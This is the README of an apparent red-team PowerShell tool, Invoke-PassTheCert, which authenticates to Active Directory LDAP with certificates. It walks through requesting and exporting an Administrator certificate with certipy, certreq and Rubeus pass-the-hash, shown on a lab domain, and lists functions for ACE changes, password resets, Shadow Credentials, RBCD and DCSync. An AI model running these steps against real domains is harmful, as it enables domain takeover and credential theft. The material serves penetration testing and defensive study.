# Invoke-PassTheCert


<div align="center">
<img src="logo.png" />
</div>

## Description

Invoke-PassTheCert is a pure PowerShell port of PassTheCert. The purpose of this repository is to expand the landscape of PowerShell tooling available to Penetration testers and red teamers. 

The original work by AlmondOffsec can be found [here](https://github.com/AlmondOffSec/PassTheCert). along with the accompanying [blog post](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

Sometimes, Domain Controllers do not support PKINIT. This can be because their certificates do not have the Smart Card Logon EKU. However, several protocols, including LDAP, support Schannel, thus authentication through TLS.

## Changelog

This fork alters [the initial code](https://github.com/The-Viper-One/Invoke-PassTheCert/tree/24eaa20b9ac15a589f294ee4e80be345c994c90d) as follows:

- Commands can be run from a computer not joined to the domain (inspired from [the PowerView's Get-DomainSearcher](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L3264-L3542)).

- Restructured code architecture and parameters for intuitive usage and easier programming (e.g. `-Action` parameter added).

- Get-Manual sections for each function added, providing detailed synopsis, syntax, parameters, examples, expected outputs, and reference links.

- Support of different types of identities, namely: `DistinguishedName`, `SID`, `GUID`, `sAMAccountName` (*not specifying a distinguishedName within `-Identity` (resp. `-Target`, `-Object`) implies `-IdentityDomain` (resp. `-TargetDomain`, `-ObjectDomain`) becomes required*).

- Added multiple LDAP Building Blocks functions (i.e. core LDAP functions upon which extra features could be implemented). These functions may *easily* be exported (especially the Helpers ones) as standalones in other projects.

- Usage of LDAP Paging Control to avoid [`The size limit was exceeded` errors](https://www.openldap.org/doc/admin26/limits.html).

- Added LDAP Enumerations and Exploitations (Groups, Kerberoasting, Shadow Credentials, Ownership, RBCD, DCSync, gMSA, etc.).

- Added a `_TODO` function to build a custom action.


## Pre-requisite - GetTh4'Cert

Provide a certificate allowed to authenticate against an LDAP/S Server. 

Otherwise, assuming a compromised user (resp. computer) has `Enrollment Rights` over the `User` (resp. `Machine`) certificate template (itself supporting the [`Client Authentication`](https://www.rfc-editor.org/rfc/rfc3280.html#section-4.2.1.13) [Extended Key Usage](https://learn.microsoft.com/fr-fr/openspecs/windows_protocols/ms-wcce/7785d392-44ce-44a2-b798-0eee3a129ebb)), we may request a certificate as follows.

### From Linux (certipy)

Using [`certipy-ad`](https://github.com/ly4k/Certipy/tree/c1d84d7ee752e574d2e90e79a5088961bf8f7567):

```powershell
$ sudo apt install -y certipy-ad
$ certipy-ad find -u '<user>@<domain>' -p '<password>' -enabled -stdout [-ns <dns_ip>] [-dc-ip <dc_ip>]
$ certipy-ad req -u '<user>@<domain>' -p '<password>' -target '<dc_fqdn>' -ca '<ca_name>' -template 'User' [-ns <dns_ip>] [-dc-ip <dc_ip>] [-dc-host '<dc_host>']
```

### From Windows (certreq)

Using [`certreq`](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862)

#### Run a PowerShell Prompt as a domain principal

- Using a Password:

```powershell
PS > runas /netonly /user:<domain>\<user> powershell.exe
```

- Using an NTHash:

```powershell
PS > Rubeus.exe createnetonly /program:powershell.exe /show
PS (createnetonly) > Rubeus.exe asktgt /nowrap /domain:'<domain>' /dc:<dc_ip> /user:'<computer>$' /rc4:'<nthash>' /ptt
```

#### Open the MMC, Add the `Certificates` Snap-in, and connect to a domain's computer

> If the  network interface of the domain's computer has the `File and Printer Sharing for Microsoft Networks` item unchecked, the MMC won't be able to connect to the domain, erroring-out `The domain ADLAB.LOCAL could not be found because: The RPC server is unavailable`.

> This step is optional if the CA Issuer's certificate has already been trusted locally (e.g. installed into your local Microsoft Certificate Store).

```
PS (runas/createnetonly) > mmc.exe /server:<dc_ip>
GUI > CTRL+M (i.e. File > Add/Remove Snap-in) > Certificates > Computer Account > Another computer > DC02 > Check Names
GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
    Find in: \\DC02\Personal
    Contains: -
    ADLAB-DC02-CA > Export > DER encoded binary X.509 (.CER)
    ADLAB-DC02-CA.cer > Install Certificate... > Current User & Local Machine > Automatically select the certificate store based on the type of certificate
```

#### Based on the provided `*.inf` file, create a request file, then request a certificate in the PowerShell session running as the domain principal

- User INF file (e.g. `Administrator`):

```powershell
PS > certreq -f -new Administrator.inf Administrator.req
    Template not found.  Do you wish to continue anyway?
    User
    CertReq: Request Created
```

```powershell
PS (runas) > certreq -f -submit -config "192.168.56.202\ADLAB-DC02-CA" Administrator.req Administrator.cer
    RequestId: 20
    RequestId: "20"
    Certificate retrieved(Issued) Issued  0x80094004, The Enrollee (CN=Administrator,CN=Users,DC=ADLAB,DC=LOCAL) has no E-Mail name registered in the Active Directory.  The E-Mail name will not be included in the certificate.
```

- Computer INF file (e.g. `SRV01`):

```powershell
PS > certreq -f -new SRV01.inf SRV01.req
Template not found.  Do you wish to continue anyway?
Machine
CertReq: Request Created
```

```powershell
PS (createnetonly) > certreq -f -submit -config "DC02.ADLAB.LOCAL\ADLAB-DC02-CA" SRV01.req SRV01.cer
RequestId: 71
RequestId: "71"
Certificate retrieved(Issued) Issued
```

> As we're dealing with Kerberos tickets, notice that we MUST use an FQDN in the latest command above (`DC02.ADLAB.LOCAL\` here, instead of `192.168.56.202\`).

> Under the hood, we may see (using [`klist`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist)) that the `host/DC02.ADLAB.LOCAL` and `RPCSS/DC02.ADLAB.LOCAL` services' TGS tickets are requested and injected into our `createnetonly` PowerShell session.



#### Install the requested certificate into the Microsoft Certificate Store

- User:

```powershell
PS > certreq -f -accept -user Administrator.rsp
    Installed Certificate:
        Serial Number: 4d0000001c61b4cb31ef3c819a00000000001c
        Subject: CN=Administrator, CN=Users, DC=ADLAB,DC=LOCAL (Other Name:Principal Name=Administrator@ADLAB.LOCAL)
        NotBefore: <DATE>
        NotAfter: <DATE>
        Thumbprint: 0e58848b07cf3b3b408ba2f57400ac5aae5f74d0
```

- Computer:

```powershell
PS > certreq -f -accept -user SRV01.rsp
    Installed Certificate:
        Serial Number: 4d00000047f6f89f60477c233c000000000047
        Subject: CN=SRV01.ADLAB.LOCAL (DNS Name=SRV01.ADLAB.LOCAL)
        NotBefore: <DATE>
        NotAfter: <DATE>
        Thumbprint: 80923c919950680113e282c68ccadfd8dbd30e2e
```


#### Make sure the newly installed certificate has an exportable private key

```powershell
PS > Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.HasPrivateKey }
[...]
0E58848B07CF3B3B408BA2F57400AC5AAE5F74D0  CN=Administrator, CN=Users, DC=ADLAB, DC=LOCAL
80923C919950680113E282C68CCADFD8DBD30E2E  CN=SRV01.ADLAB.LOCAL
```

#### Export the requested certificate into PFX format using [`Export-PfxCertificate`](https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate)

```powershell
PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\0E58848B07CF3B3B408BA2F57400AC5AAE5F74D0) -FilePath 'Administrator.pfx' -Password (New-Object System.Security.SecureString)
PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\80923C919950680113E282C68CCADFD8DBD30E2E) -FilePath 'SRV01.pfx' -Password (New-Object System.Security.SecureString)
```

> Here, both exported certificates (i.e. either from Linux, or Windows) are passwordless.


## Usage - PassTh4'Cert

Now, we may grab an LDAP Connection Instance, authenticating against an LDAP/S Server (e.g. `192.168.56.202:636`):

```powershell
PS > Import-Module .\Invoke-PassTheCert.ps1
PS > $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Port 636 -Certificate 'Administrator.pfx'
```

> As a side note, we may even export that LDAP/S Connection Instance into a passwordless/password-protected certificate file; for instance:

```powershell
PS > Import-Module .\Invoke-PassTheCert.ps1
PS > Get-Help Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -Full
PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'
PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'
```

Last, but definitely not least, Read The Funny Manual !

```powershell
PS > pwsh
PS > Import-Module .\Invoke-PassTheCert.ps1
PS > .\Invoke-PassTheCert.ps1 -?
```

> Each function's Get-Help documentation (helpers excluded) is partially shown below.

```bash
$ grep -A10 -P '^\s*function.*' Invoke-PassTheCert.ps1 |grep -vP '^(\s*|\s*<#\s*|\s+\.[A-Z]+.*|\s+(\[.*?\]|_.*)\s*)$' |sed 's/function _\?\(.*\)[[:space:]]*{/\1:/;s/^\s\+/    /' |xsel -b
```

```
LDAPExtendedOperationWhoami :
    Returns the Response of the "Who am I" LDAP Extended Operation (whoamiOID OBJECT IDENTIFIER ::= "1.3.6.1.4.1.4203.1.11.3") using an LDAP Connection Instance.
--
LDAPExtendedOperationPasswordModify :
    Executes the "Password Modify" LDAP Extended Operation (passwdModifyOID OBJECT IDENTIFIER ::= "1.3.6.1.4.1.4203.1.11.1") using an LDAP Connection Instance.
    As a result, updates the client's password associated with the specified LDAP Connection Instance.
--
Filter :
    Returns a list of [PSCustomObject] object(s) found by the LDAP query.
    - Suffixing the command with `|fl` pipe allows to print the multi-valued attributes conveniently, i.e. separated by new lines (e.g. `serviceprincipalename`, `memberof`) (no more "...").
    - Returns $null if no entry is found.
--
CreateObject :
    Creates a specified object.
    - The object MUST NOT exist.
    - (Computers) The LDAP Connection Instance's account MUST NOT have already created an MAQ (ms-DS-MachineAccountQuota) number of computers (defaults to 10 maximum per account).
    - (Users/Computers/Groups) The `sAMAccountName` MUST be UNIQUE.
--
DeleteObject :
    Deletes a specified object.
    - The object MUST exist.
--
GetInboundACEs :
    Returns all inbound ACEs over a targeted specified object.
    - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.
--
CreateInboundACE :
    Creates an inbound ACE for a principal into a targeted object. In other words, it grants/denies an ACE to the principal (source) over the targeted object (destination)
    - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.
    - The inbound ACE to create MUST NOT already exist in the target's inbound ACEs (i.e. in its `nTSecurityDescriptor`).
    - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as 'S-1-1-0', i.e. `Everyone`).
--
DeleteInboundACE :
    Deletes an inbound ACE for a principal into a targeted object. In other words, it deletes an ACE granted/denied to the principal (source) over the targeted object (destination)
    - You may manually check any `PrincipalTo*.txt` file, to get a glance of possible ACEs.
    - The inbound ACE to delete MUST already exist in the target's inbound ACEs (i.e. in its 'nTSecurityDescriptor').
    - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as 'S-1-1-0', i.e. `Everyone`).
--
GetInboundSDDLs :
    Returns the SDDL String of all the inbound ACEs applied against a specified targeted object.
--
CreateInboundSDDL :
    Creates an inbound SDDL (Security Descriptor Definition Language) for a principal into a targeted object's attribute. In other words, it grants/denies an SDDL to the principal (source) over the attribute of a targeted object (destination).
    - You may check the `DeepDiveIntoACEsAndSDDLs` to get a glance of the SDDL format.
    - IdentitySID MAY be used instead of IdentityDN, especially when such SIDs can't be looked up domain-wise (e.g. Well-Known SIDs, such as 'S-1-1-0', i.e. `Everyone`).
--
UpdatePasswordOfIdentity :
    Updates the password of the specified identity.
--
OverwriteValueInAttribute :
    Replaces the value(s) from an existing attribute on a targeted object.
    - This function overwrites ALL existing values of the specified attribute with the provided value.
    - For instance, if the `description` attribute was set to `Whoami1?!`, overwritting it with value `Whoami2?!` would set its content to `Whoami2?!`.
--
AddValueInAttribute :
    Adds a specified value to an existing attribute on a targeted object.
    - The attribute's value must be undefined, or empty. Otherwise, the attribute must be multi-valued (e.g. `serviceprincipalname`).
--
RemoveValueInAttribute :
    Removes a specified value from an existing attribute on a targeted object.
    - The attribute must have been set to (or contain, if the attribute is multi-valued, e.g. `serviceprincipalname`) the specified value.
--
ClearAttribute :
    Clears the value(s) of a specified attribute on a targeted object.
    - The attribute MUST exist (i.e. filled with at least one non-empty value).
--
AddUACFlags :
    Adds the specified UAC Flag(s) (comma-separated, if multiple) into the provided object's UAC attribute.
--
RemoveUACFlags :
    Removes the specified UAC Flag(s) (comma-separated, if multiple) from the provided object's UAC attribute.
--
ShowStatusOfAccount :
    Shows the text of the specified account's status (i.e. 'Enabled', or 'Disabled').
--
EnableAccount :
    Enables a specified account.
--
DisableAccount :
    Disables a specified account.
--
AddGroupMember :
    Adds a member to a group.
    - The group MUST NOT already contain the specified member.
--
RemoveGroupMember :
    Removes a member from a group.
    - The group MUST already contain the specified member.
--
LDAPEnum :
    Invoke-PassTheCert wrapper for LDAP enumerations.
--
LDAPExploit :
    Invoke-PassTheCert wrapper for LDAP exploitations.
--
TODO :
    Makin' My Own Custom Function.
    - The Custom Function MUST be implemented by YOU !
--
Invoke-PassTheCert-GetLDAPConnectionInstance :
    Returns an LDAP Connection Instance of a certificate-based authentication against an LDAP/S Server.
--
Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile :
    Exports an LDAP Connection Instance to a certificate file
--
Invoke-PassTheCert :
    Main function to perform various LDAP Operations after using an established LDAP Connection Instance to an LDAP/S Server through Schannel authentication with a certificate.
```


## TODOs

- Support for Start TLS.
- `CreateObject`: Implement more supported types.
- `_Helper-GetSIDTokensArray`: Make the function dynamic (i.e. replacing `<machine>`, `<domain>`, `<root-domain>` with valid values).
- `LDAPEnum`: Implement more LDAP enumerations.
- `LDAPExploit`: Implement more LDAP attacks.
- `LDAPExtendedOperationPasswordModify`: Implement the `Password Modify` LDAP Extended Operation. *Alternatively, `UpdatePasswordOfIdentity` can be used, where the identity is the LDAP Connection Instance's account.*
